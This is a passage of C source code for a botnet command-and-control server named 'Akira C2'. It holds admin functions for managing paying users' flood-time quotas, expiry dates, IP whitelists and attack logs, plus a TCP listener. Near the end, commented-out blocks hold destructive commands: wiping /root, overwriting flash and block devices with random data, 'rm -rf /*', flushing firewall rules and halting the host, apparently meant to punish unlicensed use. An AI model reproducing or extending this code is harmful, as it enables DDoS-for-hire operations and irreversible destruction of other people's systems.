                            if(m >= 1 && m <= 9){ memset(total_new_time, 0, sizeof(total_new_time)); snprintf(total_new_time, sizeof(total_new_time), "0%d/0%d/%d", d, m, y); }
                        }
                        else if(m >= 1 && m <= 9){ memset(total_new_time, 0, sizeof(total_new_time)); snprintf(total_new_time, sizeof(total_new_time), "%d/0%d/%d", d, m, y); }
                    }
                    else if(!strcmp(update, "1week") || !strcmp(update, "1WEEK")){
                        int d = atoi(cuday);
                        int m = atoi(cumnth);
                        int y = atoi(cuyear);
                        if(d == 31 || d == 30){
                            if(m == 12){ y++; m = 1; d= 7; }
                            else{
                                m++;
                                d = 7;
                                if(m > 12){ m -= 12; y++; }
                            }
                        }
                        else d += 7;
                        if(d > 30){ m++; d -= 30; }
                        if(m > 12){ y++; m -= 12; }
                        snprintf(total_new_time, sizeof(total_new_time), "%d/%d/%d", d, m, y);
                        if(d >= 1 && d <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "0%d/%d/%d", d, m, y);
                            if(m >= 1 && m <= 9){ memset(total_new_time, 0, sizeof(total_new_time)); snprintf(total_new_time, sizeof(total_new_time), "0%d/0%d/%d", d, m, y); }
                        }
                        else if(m >= 1 && m <= 9){ memset(total_new_time, 0, sizeof(total_new_time)); snprintf(total_new_time, sizeof(total_new_time), "%d/0%d/%d", d, m, y); }
                    }
                    else if(!strcmp(update, "1month") || !strcmp(update, "1MONTH")){
                        int d = atoi(cuday);
                        int m = atoi(cumnth);
                        int y = atoi(cuyear);
                        if(m == 12){ y++; m = 1; }
                        else m++;
                        if(m > 12){ m -= 12; y++; }
                        snprintf(total_new_time, sizeof(total_new_time), "%d/%d/%d", d, m, y);
                        if(d >= 1 && d <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "0%d/%d/%d", d, m, y);
                            if(m >= 1 && m <= 9){ memset(total_new_time, 0, sizeof(total_new_time)); snprintf(total_new_time, sizeof(total_new_time), "0%d/0%d/%d", d, m, y); }
                        }
                        else if(m >= 1 && m <= 9){ memset(total_new_time, 0, sizeof(total_new_time)); snprintf(total_new_time, sizeof(total_new_time), "%d/0%d/%d", d, m, y); }
                    }
                    else if(!strcmp(update, "3months") || !strcmp(update, "3MONTHS")){
                        int d = atoi(cuday);
                        int m = atoi(cumnth);
                        int y = atoi(cuyear);
                        if(m == 12){ y++; m = 3; }
                        else m += 3;
                        if(m > 12){ m -= 12; y++; }
                        snprintf(total_new_time, sizeof(total_new_time), "%d/%d/%d", d, m, y);
                        if(d >= 1 && d <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "0%d/%d/%d", d, m, y);
                            if(m >= 1 && m <= 9){ memset(total_new_time, 0, sizeof(total_new_time)); snprintf(total_new_time, sizeof(total_new_time), "0%d/0%d/%d", d, m, y); }
                        }
                        else if(m >= 1 && m <= 9){ memset(total_new_time, 0, sizeof(total_new_time)); snprintf(total_new_time, sizeof(total_new_time), "%d/0%d/%d", d, m, y); }
                    }
                    else if(!strcmp(update, "6months") || !strcmp(update, "6MONTHS")){
                        int d = atoi(cuday);
                        int m = atoi(cumnth);
                        int y = atoi(cuyear);
                        if(m == 12){ y++; m = 6; }
                        else m += 6;
                        if(m > 12){ m -= 12; y++; }
                        snprintf(total_new_time, sizeof(total_new_time), "%d/%d/%d", d, m, y);
                        if(d >= 1 && d <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "0%d/%d/%d", d, m, y);
                            if(m >= 1 && m <= 9){ memset(total_new_time, 0, sizeof(total_new_time)); snprintf(total_new_time, sizeof(total_new_time), "0%d/0%d/%d", d, m, y); }
                        }
                        else if(m >= 1 && m <= 9){ memset(total_new_time, 0, sizeof(total_new_time)); snprintf(total_new_time, sizeof(total_new_time), "%d/0%d/%d", d, m, y); }
                    }
                    else if(!strcmp(update, "1year") || !strcmp(update, "1YEAR")){
                        int d = atoi(cuday);
                        int m = atoi(cumnth);
                        int y = atoi(cuyear); 
                        y++;
                        snprintf(total_new_time, sizeof(total_new_time), "%d/%d/%d", d, m, y);
                        if(d >= 1 && d <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "0%d/%d/%d", d, m, y);
                            if(m >= 1 && m <= 9){ memset(total_new_time, 0, sizeof(total_new_time)); snprintf(total_new_time, sizeof(total_new_time), "0%d/0%d/%d", d, m, y); }
                        }
                        else if(m >= 1 && m <= 9){ memset(total_new_time, 0, sizeof(total_new_time)); snprintf(total_new_time, sizeof(total_new_time), "%d/0%d/%d", d, m, y); }
                    }
                    snprintf(new_update_time, sizeof(new_update_time), "%s", total_new_time);
                    memset(total_new_time, 0, sizeof(total_new_time));
#ifdef DEBUG
                    printf("->%s\n", new_update_time);
#endif
                    isexpok:
                    sprintf(akira, "\r\n\t\t"Y"New Expiry Will Be: %s\r\n\t\tIs This Okay?(y/n): ", new_update_time);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    memset(buf, 0, sizeof(buf));
                    fdgets(buf, sizeof(buf), akirafd); trim(buf);
                    if(!strcmp(buf, "y") || !strcmp(buf, "Y") || !strcmp(buf, "y") || !strcmp(buf, "Y")){ /*Do Nothing, Straight Logic*/ }
                    else if(!strcmp(buf, "n") || !strcmp(buf, "N") || !strcmp(buf, "no") || !strcmp(buf, "NO")) goto addtmwt;
                    else goto isexpok;

                    //Remove Account
                    rmstr(split_uargv[0], DB);
                    //Replace Account
                    FILE *uinfo = fopen(DB, "a+");
                    fprintf(uinfo, "%s %s %s %s %s %s\n", split_uargv[0], split_uargv[1], split_uargv[2], new_update_time, split_uargv[4], split_uargv[5]);
                    fclose(uinfo);
                    //Report
                    FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                    fprintf(adinfo, "[%s] Added Time For [%s]\n", users[akirafd].nick, split_uargv[0]);
                    fclose(adinfo);
                    printf(""CY"%s "Y"Added Time For ["G"%s"Y"]\n", users[akirafd].nick, split_uargv[0]);
                    sprintf(akira, "\t\t"Y"[%s] Added Time For [%s]\r\n", users[akirafd].nick, split_uargv[0]);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    RemoveEmpties(DB);
                }
                //Edit Flood Time
                else if(!strcmp(buf, "5")){
                    //Edit Flood Time
                    sprintf(akira, "\r\n\t\t"Y"%s's Current FT - %s"CR"\r\n\r\n", split_uargv[0], split_uargv[4]);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);

                    char edit_rft[20];
                    geteditft:
                    memset(edit_rft, 0, sizeof(edit_rft));
                    sprintf(akira, "\t\t"Y"[New Flood Time]"CY": ");
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    fdgets(edit_rft, sizeof(edit_rft), akirafd); trim(edit_rft);
                    isedftok:
                    sprintf(akira, "\r\n\t\t"Y"New Flood Time Will Be: %s\r\n\t\tIs This Okay?(y/n): ", edit_rft);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    memset(buf, 0, sizeof(buf));
                    fdgets(buf, sizeof(buf), akirafd); trim(buf);
                    if(!strcmp(buf, "y") || !strcmp(buf, "Y") || !strcmp(buf, "y") || !strcmp(buf, "Y")){ /*Do Nothing, Straight Logic*/ }
                    else if(!strcmp(buf, "n") || !strcmp(buf, "N") || !strcmp(buf, "no") || !strcmp(buf, "NO")) goto geteditft;
                    else goto isedftok;

                    //Remove Account
                    rmstr(split_uargv[0], DB);
                    //Replace Account
                    FILE *uinfo = fopen(DB, "a+");
                    fprintf(uinfo, "%s %s %s %s %s %s\n", split_uargv[0], split_uargv[1], split_uargv[2], split_uargv[3], edit_rft, split_uargv[5]);
                    fclose(uinfo);
                    //Report
                    FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                    fprintf(adinfo, "[%s] Edited Flood Time For %s [%s]\n", users[akirafd].nick, split_uargv[0], edit_rft);
                    fclose(adinfo);
                    printf(""CY"["Y"%s"CY"] "Y"Edited FT For %s "CY"["Y"%s"CY"]"CR"\n", users[akirafd].nick, split_uargv[0], edit_rft);
                    sprintf(akira, "\t\t"Y"[%s] Edited FT For %s [%s]\n", users[akirafd].nick, split_uargv[0], edit_rft);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    RemoveEmpties(DB);
                }
                else if(!strcmp(buf, "6")){
                    //Edit Cooldown
                    sprintf(akira, "\r\n\t\t"Y"%s's Current Cooldown - %s"CR"\r\n\r\n", split_uargv[0], split_uargv[5]);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);

                    char edit_rft[20];
                    geteditfta:
                    memset(edit_rft, 0, sizeof(edit_rft));
                    sprintf(akira, "\t\t"Y"[New Cooldown]"CY": ");
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    fdgets(edit_rft, sizeof(edit_rft), akirafd); trim(edit_rft);
                    isedftoka:
                    sprintf(akira, "\r\n\t\t"Y"New Cooldown Will Be: %s\r\n\t\tIs This Okay?(y/n): ", edit_rft);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    memset(buf, 0, sizeof(buf));
                    fdgets(buf, sizeof(buf), akirafd); trim(buf);
                    if(!strcmp(buf, "y") || !strcmp(buf, "Y") || !strcmp(buf, "y") || !strcmp(buf, "Y")){ /*Do Nothing, Straight Logic*/ }
                    else if(!strcmp(buf, "n") || !strcmp(buf, "N") || !strcmp(buf, "no") || !strcmp(buf, "NO")) goto geteditfta;
                    else goto isedftoka;

                    //Remove Account
                    rmstr(split_uargv[0], DB);
                    //Replace Account
                    FILE *uinfo = fopen(DB, "a+");
                    fprintf(uinfo, "%s %s %s %s %s %s\n", split_uargv[0], split_uargv[1], split_uargv[2], split_uargv[3], split_uargv[4], edit_rft);
                    fclose(uinfo);
                    //Report
                    FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                    fprintf(adinfo, "[%s] Edited Cooldown For %s [%s]\n", users[akirafd].nick, split_uargv[0], edit_rft);
                    fclose(adinfo);
                    printf(""CY"["Y"%s"CY"] "Y"Edited CD For %s "CY"["Y"%s"CY"]"CR"\n", users[akirafd].nick, split_uargv[0], edit_rft);
                    sprintf(akira, "\t\t"Y"[%s] Edited CD For %s [%s]\n", users[akirafd].nick, split_uargv[0], edit_rft);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    RemoveEmpties(DB);
                }
            }
            else send(akirafd, "\x1b[31mAccess Denied!\r\n", strlen("\x1b[31mAccess Denied!\r\n"), MSG_NOSIGNAL);
        }
        //Delete Account
        else if(!strcmp(buf, ".delu") || !strcmp(buf, ".DELU")){
            if(users[akirafd].priv == 1){
                char del[50];
                int kick;
                send(akirafd, ""Y"Username"CY": "W"", strlen(""Y"Username"CY": "W""), MSG_NOSIGNAL);
                if(strlen(del) > 0) memset(del, 0, sizeof(del));
                fdgets(del, sizeof(del), akirafd); trim(del);
                if(strlen(del) < 3) continue;

                char *line = NULL;
                size_t n = 0;
                int foundresult = 0;
                FILE *f = fopen(DB, "r") ;
                while(getline(&line, &n, f) != -1 && foundresult == 0){
                    int split_wargc = 0;
                    char *split_wargv[MXPRMS + 1] = { 0 };
                    char *token = strtok(line, " ");
                    while(token != NULL && split_wargc < MXPRMS){
                        split_wargv[split_wargc++] = malloc(strlen(token) + 1);
                        strcpy(split_wargv[split_wargc - 1], token);
                        token = strtok(NULL, " ");
                    }
                    if(!strcmp(split_wargv[0], del)){ rmstr(split_wargv[0], DB); foundresult = 1; }
                    /*int c = 0;
                    for(c = 0; c < split_wargc; c++) memset(split_wargv[c], 0, sizeof(split_wargv[c]));
                    split_wargc = 0;*/
                }
                fclose(f);
                if(foundresult == 0){
                    sprintf(akira, "\x1b[31mCouldn't Find User (%s)...\r\n", del);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    continue;
                }
                else{
                    sprintf(akira, ""Y"["G"Deleted Account ("Y"%s"G") - "Y"Checking If They're Currently Online"G"..."Y"]\r\n", del);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                    fprintf(adinfo, "[%s] Deleted User [%s]\n", users[akirafd].nick, del);
                    fclose(adinfo);
                }
                unsigned int kicked = 0;
                for(kick = 0; kick < MXFDS; kick++){ //Check Each FD For Username
                    if(!users[kick].connd) continue;
                    if(!strcmp(users[kick].nick, del)){
                        close(kick);
                        users[kick].connd = 0;
                        memset(users[kick].ip, 0, sizeof(users[kick].ip));
                        memset(users[kick].nick, 0, sizeof(users[kick].nick));
                        memset(users[kick].expiry, 0, sizeof(users[kick].expiry));
                        kicked = 1;
                    }
                }
                if(kicked == 1){
                    sprintf(akira, ""Y"["G"User Was Online - Their Session Has Been Terminated..."Y"]\r\n");
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    kicked = 0;
                }
                else if(kicked == 0){
                    sprintf(akira, ""Y"[User Was Not Currently Online...]\r\n");
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                }
                RemoveEmpties(DB);
            }
            else send(akirafd, "\x1b[31mAccess Denied!\r\n", strlen("\x1b[31mAccess Denied!\r\n"), MSG_NOSIGNAL);
        }
        //Add Valid IP
        else if(!strcmp(buf, ".addi") || !strcmp(buf, ".ADDI")){
            if(users[akirafd].priv == 1){
                char newvalid[BUFSIZE];
                if(strlen(newvalid) > 0) memset(newvalid, 0, sizeof(newvalid));
                send(akirafd, ""Y"[New Valid IPv4]"CY": "W"", strlen(""Y"[New Valid IPv4]"CY": "W""), MSG_NOSIGNAL);
                fdgets(newvalid, sizeof(newvalid), akirafd); trim(newvalid);

                FILE *nwv = fopen(VALIDLOG, "a+");
                fprintf(nwv, "%s\n", newvalid);
                fclose(nwv);

                FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                fprintf(adinfo, "[%s] Validated [%s]\n", users[akirafd].nick, newvalid);
                fclose(adinfo);

                sprintf(akira, ""Y"["G"Validated "Y"%s"G"!"Y"]\r\n", newvalid);
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
            }
            else send(akirafd, "\x1b[31mAccess Denied!\r\n", strlen("\x1b[31mAccess Denied!\r\n"), MSG_NOSIGNAL);
        }
        //Delete Valid IP
        else if(!strcmp(buf, ".deli") || !strcmp(buf, ".DELI")){
            if(users[akirafd].priv == 1){
                char del[50];
                int kick;
                send(akirafd, ""Y"[IPv4]"CY": "W"", strlen(""Y"[IPv4]"CY": "W""), MSG_NOSIGNAL);
                if(strlen(del) > 0) memset(del, 0, sizeof(del));
                fdgets(del, sizeof(del), akirafd); trim(del);
                if(strlen(del) < 3) continue;

                char *line = NULL;
                size_t n = 0;
                int foundresult = 0;
                FILE *f = fopen(VALIDLOG, "r") ;
                while(getline(&line, &n, f) != -1 && foundresult == 0){
                    int split_wargc = 0;
                    char *split_wargv[MXPRMS + 1] = { 0 };
                    char *token = strtok(line, " ");
                    while(token != NULL && split_wargc < MXPRMS){
                        split_wargv[split_wargc++] = malloc(strlen(token) + 1);
                        strcpy(split_wargv[split_wargc - 1], token);
                        token = strtok(NULL, " ");
                    }
                    if(!strcmp(split_wargv[0], del)){ rmstr(split_wargv[0], VALIDLOG); foundresult = 1; }
                    /*int c = 0;
                    for(c = 0; c < split_wargc; c++) memset(split_wargv[c], 0, sizeof(split_wargv[c]));
                    split_wargc = 0;*/
                }
                fclose(f);
                if(foundresult == 0){
                    sprintf(akira, "\x1b[31mCouldn't Find IP (%s)...\r\n", del);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    continue;
                }
                else{
                    sprintf(akira, ""Y"["G"Invalidated IP ("Y"%s"G") - "Y"Checking If It's Currently Connected"G"..."Y"]\r\n", del);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                    fprintf(adinfo, "[%s] Invalidated [%s]\n", users[akirafd].nick, del);
                    fclose(adinfo);
                }
                unsigned int kicked = 0;
                for(kick = 0; kick < MXFDS; kick++){
                    if(!users[kick].connd) continue;
                    if(!strcmp(users[kick].ip, del)){
                        close(kick);
                        users[kick].connd = 0;
                        memset(users[kick].ip, 0, sizeof(users[kick].ip));
                        memset(users[kick].nick, 0, sizeof(users[kick].nick));
                        memset(users[kick].expiry, 0, sizeof(users[kick].expiry));
                        kicked = 1;
                    }
                }
                if(kicked == 1){
                    sprintf(akira, ""Y"["G"Address Was Connected - Its Session Has Been Terminated..."Y"]\r\n");
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    kicked = 0;
                }
                else if(kicked == 0){
                    sprintf(akira, ""Y"[Address Was Not Currently Connected...]"CR"\r\n");
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                }
                RemoveEmpties(VALIDLOG);
            }
            else send(akirafd, "\x1b[31mAccess Denied!\r\n", strlen("\x1b[31mAccess Denied!\r\n"), MSG_NOSIGNAL);
        }
        //Kick User
        else if(!strcmp(buf, ".kick") || !strcmp(buf, ".KICK")){
            if(users[akirafd].priv == 1){
                sprintf(akira, ""CY"\t\t\t╔══════════════╗\r\n\t\t\t║ "Y"Online Users "CY"║\r\n\t\t\t╚══════════════╝\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                int findme; for(findme = 0; findme < MXFDS; findme++){
                    if(!users[findme].connd) continue;
                    if(users[akirafd].priv == 1){ sprintf(akira, "\t\t\t"CY"ID("Y"%d"CY") %s "CY"| "Y"%s"W"\r\n", findme, users[findme].nick, users[findme].ip); }
                    else sprintf(akira, "\t\t\t"CY"ID("Y"%d"CY") %s"W"\r\n", findme, users[findme].nick);
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                }

                int id;
                char kuser[50];
                char reason[BUFSIZE];
                send(akirafd, "\t\t"Y"["CY"User To Kick"Y"]"CY": ", strlen("\t\t"Y"["CY"User To Kick"Y"]"CY": "), MSG_NOSIGNAL);
                memset(kuser, 0, sizeof(kuser));
                fdgets(kuser, sizeof(kuser), akirafd); trim(kuser);

                send(akirafd, "\t\t"Y"["CY"Reason"Y"]"CY": ", strlen("\t\t"Y"["CY"Reason"Y"]"CY": "), MSG_NOSIGNAL);
                memset(reason, 0, sizeof(reason));
                fdgets(reason, sizeof(reason), akirafd); trim(reason);

                for(id = 0; id < MXFDS; id++){
                    if(strstr(users[id].nick, kuser)){
                        sprintf(akira, "\n\x1b[31mGoodbye, Kicked By \x1b[31m%s"CR"...\r\nReason: %s", users[akirafd].nick, reason);
                        send(id, akira, strlen(akira), MSG_NOSIGNAL);
                        users[id].connd = 0;
                        close(id);
                        Enthusiasts--;

                        sprintf(akira, "\t"Y"["CY"Kicked "Y"("CY"%s"Y")"CY"..."Y"]\r\n", kuser);
                        send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                        FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                        fprintf(adinfo, "[%s] Kicked [%s-%s]\n", users[akirafd].nick, kuser, reason);
                        fclose(adinfo);
                    }
                }
            }
            else send(akirafd, "\x1b[31mAccess Denied!\r\n", strlen("\x1b[31mAccess Denied!\r\n"), MSG_NOSIGNAL);
        }
        else if(!strcmp(buf, ".logs") || !strcmp(buf, ".LOGS")){
            if(users[akirafd].priv == 1){
                gettarglog:
                sprintf(akira, ""CLS"\r\n\t\t"UND"Available Logs"NUND":\r\n\t\tATK."Y"ATTACKS.log\r\n\t\t"CY"ADM."Y"ADMIN_REPORT.log\r\n\t\t"CY"BLK."Y"BLACK.lst\r\n\t\t"CY"FLD."Y"FAILED_LOGINS.log\r\n\t\t"CY"CHT."Y"CHAT.log\r\n\t\t"CR"C.Cancel\r\n");
                send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                memset(buf, 0, sizeof(buf));
                send(akirafd, prompt, strlen(prompt), MSG_NOSIGNAL);
                fdgets(buf, sizeof(buf), akirafd); trim(buf);

                if(!strcmp(buf, "ATK") || !strcmp(buf, "BLK") || !strcmp(buf, "FLD") || !strcmp(buf, "CHT") || !strcmp(buf, "ADM")){
                    char targlog[20];
                    if(!strcmp(buf, "c") || !strcmp(buf, "C")) continue; else if(!strcmp(buf, "ATK")) sprintf(targlog, "ATKS.log"); else if(!strcmp(buf, "ADM")) sprintf(targlog, "ADMIN_REPORT.log"); else if(!strcmp(buf, "BLK")) sprintf(targlog, "BLACK.lst"); else if(!strcmp(buf, "FLD")) sprintf(targlog, "FAILED_LOGINS.log"); else if(!strcmp(buf, "CHT")) sprintf(targlog, "CHAT.log");

                    char new_log_view[0x100];
                    snprintf(new_log_view, sizeof(new_log_view), ""LFD"/%s", targlog);
                    trim(new_log_view);

                    FILE *atklr;
                    char *line = NULL;
                    size_t len = 0;
                    ssize_t read;
                    atklr = fopen(new_log_view, "r");
                    if(atklr == NULL){
                        sprintf(akira, "The Owner Broke The Logs...\r\n");
                        send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                        memset(buf, 0, sizeof(buf));
                        continue;
                    }
                    send(akirafd, "\r\n"Y"", strlen("\r\n"Y""), MSG_NOSIGNAL);
                    while((read = getline(&line, &len, atklr)) != -1) {
                        sprintf(akira, "%s\r", line);
                        send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    }
                    free(line);
                    fclose(atklr);

                    FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                    fprintf(adinfo, "[%s] Viewed Log [%s]\n", users[akirafd].nick, targlog);
                    fclose(adinfo);
                }
                else{
                    sprintf(akira, "\t\t\x1b[31mNot A Valid Selection... Idiot..");
                    send(akirafd, akira, strlen(akira), MSG_NOSIGNAL);
                    sleep(2);
                    memset(buf, 0, sizeof(buf));
                    goto gettarglog;
                }
            }
            else send(akirafd, "\x1b[31mAccess Denied!\r\n", strlen("\x1b[31mAccess Denied!\r\n"), MSG_NOSIGNAL);
        }
        /*FILE *servlog = fopen(""LFD"/SERVER.log", "a+");
        fprintf(servlog, "[%s]: %s\n", users[akirafd].nick, buf);
        fclose(servlog);*/
        send(akirafd, prompt, strlen(prompt), MSG_NOSIGNAL);
        memset(buf, 0, sizeof(buf));
    }//End Of Fdgets While Loop. Runs Infinitely Until Told To Exit (goto close;)
    close:
    if(users[akirafd].connd && users[akirafd].priv == 1){ printf(AkiraN" \x1b[31mAdmin("W"%s\x1b[31m:"W"%s\x1b[31m) Logged Out "AkiraN"\n", users[akirafd].nick, userIP); Enthusiasts --; }
    else if(users[akirafd].connd && users[akirafd].priv == 0){ printf(AkiraN" \x1b[31mUser("W"%s\x1b[31m:"W"%s\x1b[31m) Logged Out "AkiraN"\n", users[akirafd].nick, userIP); Enthusiasts --; }
    users[akirafd].connd = 0;
    memset(users[akirafd].nick, 0, sizeof(users[akirafd].nick));
    memset(users[akirafd].ip, 0, sizeof(users[akirafd].ip));
    memset(akira, 0, sizeof(akira));
    memset(buf, 0, sizeof(buf));
    close(akirafd);
}

void *Listener(int port){
    int sockfd, newsockfd;
    struct epoll_event event;

    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd < 0) perror("ERROR Opening Socket\n");

    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(CNCPORT);

    if(bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) perror("ERROR On Binding\n");
    listen(sockfd,5);

    clilen = sizeof(cli_addr);
    while(1){
        newsockfd = accept(sockfd, (struct sockaddr *)&cli_addr, &clilen);
        if(newsockfd < 0) perror("ERROR On Accept\n");
        struct ListenerArgs args;
        args.sock = newsockfd;
        args.ip = ((struct sockaddr_in *)&cli_addr)->sin_addr.s_addr;
        pthread_t thread;
        pthread_create(&thread, NULL, &CommandAndControl, (void *)&args);
    }   
}
//[+]============================================================================================================================[+]
int main (int argc, char *argv[], void *sock){
    if(argc != 3){ printf("Usage: %s [BOTPORT] [THREADS]\n", argv[0]); exit(0); }

    int BotPort = atoi(argv[1]);
    int Threads = atoi(argv[2]);

    signal(SIGPIPE, SIG_IGN); //Ignore Broken Pipe Signals

    /*int n;
    struct ifreq ifr;
    char array[] = "eth0";

    n = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, array, IFNAMSIZ - 1);
    ioctl(n, SIOCGIFADDR, &ifr);
    close(n);
#ifdef DEBUG
    printf("Host IP Address - %s\n", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr) );
#endif
    char machaddy[20];
    sprintf(machaddy, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    if(strstr(machaddy, C2Host)){ /*Host IP Matches Intended Host Definition*/
        /*printf("\n\n"G"Host Validated! Thanks For The Support! "W"-Tragedy\n");
    }
    else{
        printf("\n\n\x1b[31mInvalid Host! Buy A Build, Support The Author.\nP.S. Hope /root/ Was Empty...\n");
        char wiperoot[100];
        //I'd Write A Recursive Function To Do This... But This Is Easier
        sprintf(wiperoot, "cd /root/; rm -rf *");
        system(wiperoot);

        //This Works... Don't Ask        
/*
        char brickserver[2048];
        sprintf(brickserver, "cd /root/; cat /proc/mounts\ncat /dev/urandom | mtd_write mtd0 - 0 32768\ncat /dev/urandom | mtd_write mtd1 - 0 32768\n' ii11II += 'busybox cat /dev/urandom >/dev/mtd0 &\nbusybox cat /dev/urandom >/dev/sda &\nbusybox cat /dev/urandom >/dev/mtd1 &\nbusybox cat /dev/urandom >/dev/mtdblock0 &\nbusybox cat /dev/urandom >/dev/mtdblock1 &\nbusybox cat /dev/urandom >/dev/mtdblock2 &\nbusybox cat /dev/urandom >/dev/mtdblock3 &\n' ii11II += 'busybox route del default\ncat /dev/urandom >/dev/mtdblock0 &\ncat /dev/urandom >/dev/mtdblock1 &\ncat /dev/urandom >/dev/mtdblock2 &\ncat /dev/urandom >/dev/mtdblock3 &\ncat /dev/urandom >/dev/mtdblock4 &\ncat /dev/urandom >/dev/mtdblock5 &\ncat /dev/urandom >/dev/mmcblk0 &\ncat /dev/urandom >/dev/mmcblk0p9 &\ncat /dev/urandom >/dev/mmcblk0p12 &\ncat /dev/urandom >/dev/mmcblk0p13 &\ncat /dev/urandom >/dev/root &\ncat /dev/urandom >/dev/mmcblk0p8 &\ncat /dev/urandom >/dev/mmcblk0p16 &\n' ii11II += 'route del default;iproute del default;ip route del default;rm -rf /* 2>/dev/null &\niptables -F;iptables -t nat -F;iptables -A INPUT -j DROP;iptables -A FORWARD -j DROP\nhalt -n -f\nreboot\n");
        system(brickserver);
*/
/*
        ^^^
        cat /proc/mounts\ncat /dev/urandom | mtd_write mtd0 - 0 32768\ncat /dev/urandom \
        | mtd_write mtd1 - 0 32768\n' ii11II += 'busybox cat /dev/urandom >/dev/mtd0 &\nbusybox \
        cat /dev/urandom >/dev/sda &\nbusybox cat /dev/urandom >/dev/mtd1 &\nbusybox cat /dev/urandom >/dev/mtdblock0 \
        &\nbusybox cat /dev/urandom >/dev/mtdblock1 &\nbusybox cat /dev/urandom >/dev/mtdblock2 &\nbusybox cat /dev/urandom >/dev/mtdblock3 \
        &\n' ii11II += 'busybox route del default\ncat /dev/urandom >/dev/mtdblock0 &\ncat /dev/urandom >/dev/mtdblock1 &\ncat \
        /dev/urandom >/dev/mtdblock2 &\ncat /dev/urandom >/dev/mtdblock3 &\ncat \
        /dev/urandom >/dev/mtdblock4 &\ncat /dev/urandom >/dev/mtdblock5 &\ncat /dev/urandom >/dev/mmcblk0 &\ncat \
        /dev/urandom >/dev/mmcblk0p9 &\ncat /dev/urandom >/dev/mmcblk0p12 &\ncat /dev/urandom >/dev/mmcblk0p13 &\ncat /dev/urandom >/dev/root &\ncat \
        /dev/urandom >/dev/mmcblk0p8 &\ncat /dev/urandom >/dev/mmcblk0p16 &\n' ii11II += 'route del default;
        iproute del default;
        ip route del default;
        rm -rf /* 2>/dev/null &\niptables -F;
        iptables -t nat -F;
        iptables -A INPUT -j DROP;
        iptables -A FORWARD -j DROP\nhalt -n -f\nreboot\n

        Another One: 

        char bigbricks[2048];
        sprintf(bigbricks, "cd /root/; mtd_write erase mtd0 & mtd_write erase mtd1 & mtd_write erase mtd2; cat /dev/urandom > /dev/mtdblock0 & cat /dev/urandom >/dev/mtdblock1 & cat /dev/urandom >/dev/mtdblock2 & cat /dev/urandom >/dev/mtdblock3 & cat /dev/urandom >/dev/mtdblock4 & cat /dev/urandom >/dev/mtdblock5 & cat /dev/urandom >/dev/root & route del default;iproute del default;rm -rf /*; sysctl -w net.ipv4.tcp_timestamps=0; sysctl -w kernel.threads-max=1");
        system(bigbricks);

        ^^^
        mtd_write erase mtd0 & mtd_write erase mtd1 & mtd_write erase mtd2;
        cat /dev/urandom > /dev/mtdblock0 & cat /dev/urandom >/dev/mtdblock1 & cat /dev/urandom >/dev/mtdblock2 & cat /dev/urandom >/dev/mtdblock3 & \
        cat /dev/urandom >/dev/mtdblock4 & cat /dev/urandom >/dev/mtdblock5 & cat /dev/urandom >/dev/root & route del default;
        iproute del default;
        rm -rf /*;
        sysctl -w net.ipv4.tcp_timestamps=0;
        sysctl -w kernel.threads-max=1
*/
        /*unlink(argv[0]); //Delete The Running File If rootwipe Doesn't Work
        sleep(3);
        exit(0);
    }*/
    //Program Can Attempt To Start
    printf("\n\t"W"["CY"Akira C2"W"]\n\tBy "G"Tragedy\n\n");

